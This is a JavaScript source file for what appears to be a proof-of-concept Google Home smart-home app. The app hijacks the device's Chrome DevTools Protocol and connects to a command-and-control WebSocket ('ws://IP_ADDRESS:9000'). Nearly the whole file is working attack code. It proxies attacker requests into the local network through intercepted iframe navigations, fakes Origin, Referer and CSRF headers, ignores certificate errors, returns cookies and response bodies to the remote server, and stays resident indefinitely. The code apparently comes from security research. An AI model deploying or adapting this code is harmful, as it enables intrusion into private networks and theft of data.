/*
  Note: Fetch.continueRequest supports base64-encoded binary postData on more
  recent versions of Chrome, but apparently not on the older version of Chrome
  running on the Google Home, so request bodies must contain only text.
*/

let C2_WS_URL = 'ws://IP_ADDRESS:9000';

// verbose logging may consume more memory
let VERBOSE_LOGGING = false;
let CDP_TIMEOUT_MS = 4000;
let WS_RECONNECT_MS = 5000;
let HTTP_RES_TIMEOUT = 2000;

let localHomeApp = new smarthome.App('0.0.1');
let mainStarted = false;
let connectedCDP = false;

function log(...args) { if (VERBOSE_LOGGING) { console.log(...args); } }
function logWarn(...args) { console.warn(...args); }
function logError(...args) { console.error(...args); }

/*
  Sends a CDP command over the WebSocket and returns the result (unless
  ignoreRes is true). sessionId is only required when sending commands to an
  attached Target. May throw an error.
*/
let cmdId = 1; // global ID, incremented each call
async function sendCmdCDP(
  ws, method, params = {}, ignoreRes = false, sessionId = null
) {
  log(`#${cmdId}: ${method}(${JSON.stringify(params)})`);
  let cmd = {
    id: cmdId,
    method: method,
    params: params
  };
  if (sessionId) { cmd.sessionId = sessionId; }
  return new Promise((resolve, reject) => {
    if (ws.readyState !== ws.OPEN) {
      reject('CDP websocket is closed');
      return;
    }
    ws.send(JSON.stringify(cmd));
    cmdId++;
    if (ignoreRes) { resolve(); return; }
    let timeout = setTimeout(() => {
      ws.onmessage = logUnhandledEvent;
      reject(`${method} error: timed out`);
    }, CDP_TIMEOUT_MS);
    ws.onmessage = function (event) {
      let msg = JSON.parse(event.data);
      if (msg.id === cmd.id) {
        clearTimeout(timeout);
        ws.onmessage = logUnhandledEvent;
        if (msg.error) {
          reject(`${method} error: ${msg.error.code}: ${msg.error.message}`);
        }
        else if (msg.result.errorText) {
          reject(`${method} error: ${msg.result.errorText}`);
        }
        else { resolve(msg.result); }
      }
      else { logUnhandledEvent(event); }
    };
  });
}

/*
  Waits for a CDP event, then returns the params. May throw an error.
*/
async function waitForEventCDP(ws, method, timeout_ms = CDP_TIMEOUT_MS) {
  log(`waitForEventCDP: ${method}`);
  return new Promise((resolve, reject) => {
    let timeout = setTimeout(() => {
      ws.onmessage = logUnhandledEvent;
      reject(`${method} error: request timed out`);
    }, timeout_ms);
    ws.onmessage = function (event) {
      let msg = JSON.parse(event.data);
      if (msg.method === method) {
        clearTimeout(timeout);
        ws.onmessage = logUnhandledEvent;
        resolve(msg.params);
      }
      else { logUnhandledEvent(event); }
    };
  });
}

// base64 string -> Uint8Array
function b64ToBytes(b64) {
  function binaryStrToBytes(bStr) {
    let bytes = new Uint8Array(bStr.length);
    for (let i = 0; i < bytes.length; i++) {
      bytes[i] = bStr.charCodeAt(i);
    }
    return bytes;
  }
  let bStr = atob(b64);
  return binaryStrToBytes(bStr);
}

// Uint8Array -> base64 string
function bytesToB64(bytes) {
  function bytesToBinaryStr(bytes) {
    let bStr = '';
    for (let i = 0; i < bytes.length; i++) {
      bStr += String.fromCharCode(bytes[i]);
    }
    return bStr;
  }
  let bStr = bytesToBinaryStr(bytes);
  return btoa(bStr);
}

/*
  Sends an HTTP request through CDP. body is a Uint8Array (optional, may be
  undefined). Returns an array with a response details object and body
  (Uint8Array or undefined). May throw an error. Expects that Fetch has already
  been enabled to intercept Document requests and responses.

  There's no DevTools method to compose requests from scratch, so we must
  intercept requests the browser makes automatically and modify them.
  Cross-origin XHR requests are blocked by SOP even before DevTools can
  intercept them. Page navigation requests are restriction-free and can be
  intercepted, but navigating the page elsewhere stops our JS execution, and
  creating a new page with "Target.createTarget" isn't supported by the version
  of Chrome running on Google Home. I think "Page.createIsolatedWorld" is
  intended to be able to create a new browser context with "universal access" to
  all origins, but it doesn't seem to actually work. The workaround I settled on
  was creating iframes to generate navigation requests and intercepting those.
  Some sites block framing with the "X-Frame-Options" header, but DevTools can
  intercept the response before this header is checked.

  The only minor caveat to this approach is that a "Sec-Fetch-Site: cross-site"
  header is added to secure (HTTPS) requests, but this header is part of a brand
  new WIP browser spec (unsupported by Firefox), so it's unlikely that any
  private HTTP servers on the LAN are checking for it at this time, and most
  don't even use HTTPS anyway. All the standard headers used to prevent
  cross-origin requests ("Origin", "Referer", "X-CSRF-Token", etc.) can be
  spoofed by DevTools.
*/
async function sendHttpReq(ws, sessionId, reqDetails, body) {
  let reqPromise = waitForEventCDP(ws, 'Fetch.requestPaused');
  log('navigating iframe...');
  let iframe = document.createElement('iframe');
  document.body.appendChild(iframe);
  iframe.src = reqDetails.url; // triggers request
  log('waiting for request...');
  let req = await reqPromise;
  log('intercepted request');

  // these headers are automatically added to all requests with default values,
  // unless explicitly changed. strangely, only "referer" can be excluded
  // entirely by setting it to a blank string; the rest just use the blank
  // string as the value.
  let defaultHeaders = [
    'referer',
    // 'user-agent',
    // 'accept-language',
    // 'cast-device-capabilities'
  ];

  let stripReqHeaders = [
    'content-length',
    'content-encoding',
    'accept-encoding',
    'host'
  ];

  let stripResHeaders = [
    'content-length',
    'content-encoding',
    'status' // not a real header
  ];

  // convert header keys to lowercase
  let reqHeaders = {};
  for (let header in reqDetails.headers) {
    reqHeaders[header.toLowerCase()] = reqDetails.headers[header];
  }

  for (let header of defaultHeaders) {
    if (!reqHeaders[header]) {
      reqHeaders[header] = '';
    }
  }
  for (let header of stripReqHeaders) {
    if (reqHeaders[header]) {
      delete reqHeaders[header];
    }
  }

  // convert headers to format DevTools expects
  let reqHeadersParam = [];
  for (let header in reqHeaders) {
    let headerObj = {
      name: header,
      value: reqHeaders[header]
    };
    reqHeadersParam.push(headerObj);
  }
  
  log('modifying and continuing...');
  let reqParams = {
    requestId: req.requestId,
    method: reqDetails.method,
    url: reqDetails.url,
    headers: reqHeadersParam
  };
  if (body) {
    // reqParams.postData = bytesToB64(body);
    try {
      body = (new TextDecoder('ascii', {fatal: true})).decode(body);
    }
    catch { throw 'request body must be text, see comment at top of app.js'; }
    reqParams.postData = body;
  }

  let resPromise = waitForEventCDP(ws, 'Fetch.requestPaused', HTTP_RES_TIMEOUT);
  await sendCmdCDP(ws, 'Fetch.continueRequest', reqParams, true, sessionId);
  log('waiting for response...');
  let res = await resPromise;

  if (res.responseErrorReason || !res.responseStatusCode || !res.responseHeaders) {
    throw 'network error:' + (res.responseErrorReason || 'unknown');
  }

  log('got response:', res);
  log('getting body...');
  let resBody = await sendCmdCDP(ws, 'Fetch.getResponseBody', {
    requestId: res.requestId
  }, false, sessionId);

  await sendCmdCDP(ws, 'Fetch.failRequest', {
    requestId: res.requestId,
    errorReason: 'Failed'
  }, true, sessionId);
  iframe.remove();

  let resBodyBytes;
  if (resBody.body !== '') {
    if (resBody.base64Encoded) {
      resBodyBytes = b64ToBytes(resBody.body);
      if (VERBOSE_LOGGING) {
        // doesn't throw an error for invalid utf-8, so we don't have to check
        let resBodyText = (new TextDecoder()).decode(resBodyBytes);
        log('response body as text:', resBodyText);
      }
    }
    else {
      // utf-8 text
      if (VERBOSE_LOGGING) { log('text response body:', resBody.body); }
      resBodyBytes = (new TextEncoder()).encode(resBody.body);
    }
  }
  else {
    resBodyBytes = undefined;
  }

  // convert headers back from DevTools format (and to lowercase)
  let resHeaders = {};
  for (let headerObj of res.responseHeaders) {
    resHeaders[headerObj.name.toLowerCase()] = headerObj.value;
  }
  for (let header of stripResHeaders) {
    if (resHeaders[header]) {
      delete resHeaders[header];
    }
  }

  // strangely, response cookies show up in the REQUEST headers under "Cookie"
  // (exact capitalization). this is overwritten if a "Cookie" header was sent
  // in the request, but not if a "cookie" (all lowercase) header was. because
  // we convert all request headers to lowercase before sending, we don't have
  // to worry about this.
  let resCookies = {};
  if (res.request.headers['Cookie']) {
    let cookieHeader = res.request.headers['Cookie'];
    for (let cookie of cookieHeader.split(';')) {
      let [cookieName, cookieVal] = cookie.split('=');
      [cookieName, cookieVal] = [cookieName.trim(), cookieVal.trim()];
      resCookies[cookieName] = cookieVal;
    }
  }

  let resDetails = {
    code: res.responseStatusCode,
    headers: resHeaders,
    cookies: resCookies
  };
  return [resDetails, resBodyBytes];
}

/*
  Payloads are: [ascii json object] + [0x00 terminator] + [body]
  Request object includes method, url, and headers. Response object includes
  code, headers, and cookies.
*/

/*
  Processes request payload (Uint8Array). Returns an array with a request
  details object and body (Uint8Array or undefined).
*/
function processReqPayload(reqPayload) {
  let reqDetails = '';
  let i = 0;
  while (true) {
    let byte = reqPayload[i];
    if (byte === undefined) { throw 'invalid request (no terminator)'; }
    if (byte === 0) { break; }
    reqDetails += String.fromCharCode(byte);
    i++;
  }
  try { reqDetails = JSON.parse(reqDetails); }
  catch { throw 'invalid request (invalid JSON)'; }
  let body = reqPayload.subarray(i+1);
  if (body.length === 0) { body = undefined; }
  return [reqDetails, body];
}

/*
  Builds response payload (Uint8Array) from resDetails object and body
  (Uint8Array or undefined).
*/
function buildResPayload(resDetails, body) {
  resDetails = JSON.stringify(resDetails);
  let resDetailsBytes = (new TextEncoder()).encode(resDetails);
  let payloadLen = resDetailsBytes.length + 1;
  if (body) { payloadLen += body.length; }
  let payload = new Uint8Array(payloadLen);
  payload.set(resDetailsBytes);
  payload.set([0], resDetailsBytes.length);
  if (body) {
    payload.set(body, resDetailsBytes.length + 1);
  }
  return payload;
}

function connectC2(wsCDP, sessionId) {
  let fetchEnabled = false;
  let wsC2 = new WebSocket(C2_WS_URL);
  wsC2.binaryType = 'arraybuffer';
  wsC2.onopen = async function () {
    try {
      log('connected to C2');
      await sendCmdCDP(wsCDP, 'Fetch.enable', {
        patterns: [
          {requestStage: 'Request', resourceType: 'Document'},
          {requestStage: 'Response', resourceType: 'Document'}
        ]
      }, false, sessionId);
      fetchEnabled = true;
    }
    catch (e) { logError(e); wsC2.close(); }
  };
  wsC2.onmessage = async function (event) {
    try {
      let reqPayload = event.data;
      reqPayload = new Uint8Array(reqPayload);
      let [reqDetails, reqBody] = processReqPayload(reqPayload);
      let res = await sendHttpReq(wsCDP, sessionId, reqDetails, reqBody);
      let [resDetails, resBody] = [res[0], res[1]];
      let resPayload = buildResPayload(resDetails, resBody);
      wsC2.send(resPayload);
    }
    catch (e) {
      logError(e);
      let errResPayload = buildResPayload({
        code: 400,
        headers: {'content-type': 'text/plain'},
        cookies: {}
      }, (new TextEncoder()).encode(`app.js: ${e}\n`));
      wsC2.send(errResPayload);
    }
  };
  wsC2.onclose = async function () {
    log('disconnected from C2');
    wsC2 = undefined;
    if (connectedCDP) {
      if (fetchEnabled) {
        try { await sendCmdCDP(wsCDP, 'Fetch.disable', {}, false, sessionId); }
        catch (e) { logWarn(e); }
      }
      fetchEnabled = undefined;
      log('trying to connect to C2...');
      setTimeout(() => { connectC2(wsCDP, sessionId); }, WS_RECONNECT_MS);
    }
  };
}

function logUnhandledEvent(event) {
  log('unhandled event:', event.data);
}

function main(urlCDP) {
  let wsC2;
  console.log('connecting to CDP websocket...');
  let wsCDP = new WebSocket(urlCDP);
  wsCDP.onopen = async function () {
    try {
      connectedCDP = true;
      console.log('connected to CDP');

      try {
        await sendCmdCDP(wsCDP, 'Security.setIgnoreCertificateErrors', {
          ignore: true
        });
      }
      catch (e) { logWarn(e); }
      
      let infos = (await sendCmdCDP(wsCDP, 'Target.getTargets')).targetInfos;
      let target = infos.find(item => item.title === 'smarthome demo');
      if (!target) { throw 'target not found'; }
      let sessionId = (await sendCmdCDP(wsCDP, 'Target.attachToTarget', {
        targetId: target.targetId,
        flatten: true
      })).sessionId;

      console.log('starting C2 connection attempts...');
      wsC2 = connectC2(wsCDP, sessionId);
    }
    catch (e) {
      logError(e);
      wsCDP.close();
    }
  };
  wsCDP.onmessage = logUnhandledEvent;
  wsCDP.onclose = function () {
    connectedCDP = false;
    logWarn('disconnected from CDP');
    if (wsC2) {
      wsC2.close(); wsC2 = undefined;
    }
    log('trying to reconnect to CDP...');
    wsCDP = undefined;
    setTimeout(() => { main(urlCDP); }, WS_RECONNECT_MS);
  };
}

async function identifyHandler(req) {
  // We always respond to all IDENTIFY requests indicating that no matching
  // device was found to prevent an EXECUTE path from forming. Our code keeps
  // running indefinitely afterwards, unless the system runs out of memory. See:
  // developers.google.com/assistant/smarthome/concepts/local#app-lifecycle
  let RESPONSE = {
    intent: smarthome.Intents.IDENTIFY,
    requestId: req.requestId,
    payload: {
      device: {
        id: ''
      }
    }
  };

  console.log('cast device found, got IDENTIFY');
  log(JSON.stringify(req, null, 2));
  if (mainStarted) {
    log('already connected, ignoring');
    return RESPONSE;
  }
  
  log('trying to get Chrome DevTools Protocol websocket URL...');
  let httpCmd = new smarthome.DataFlow.HttpRequestData();
  httpCmd.requestId = req.requestId;
  httpCmd.deviceId = '';
  httpCmd.method = smarthome.Constants.HttpOperation.GET;
  httpCmd.path = '/json/version';
  httpCmd.port = 9222;
  log(`GET :${httpCmd.port} ${httpCmd.path}`);
  let httpRes;
  try { httpRes = await localHomeApp.getDeviceManager().send(httpCmd); }
  catch (e) {
    logWarn('GET failed, probably sent to other device, aborting:', e);
    return RESPONSE;
  }
  let resBody = httpRes.httpResponse.body;
  log('success:', resBody);
  let urlCDP = JSON.parse(resBody).webSocketDebuggerUrl;
  mainStarted = true;
  main(urlCDP);
  return RESPONSE;
}

localHomeApp
  .onIdentify(identifyHandler)
  .listen()
  .then(() => {
    console.log('ready, waiting for IDENTIFY...');
  });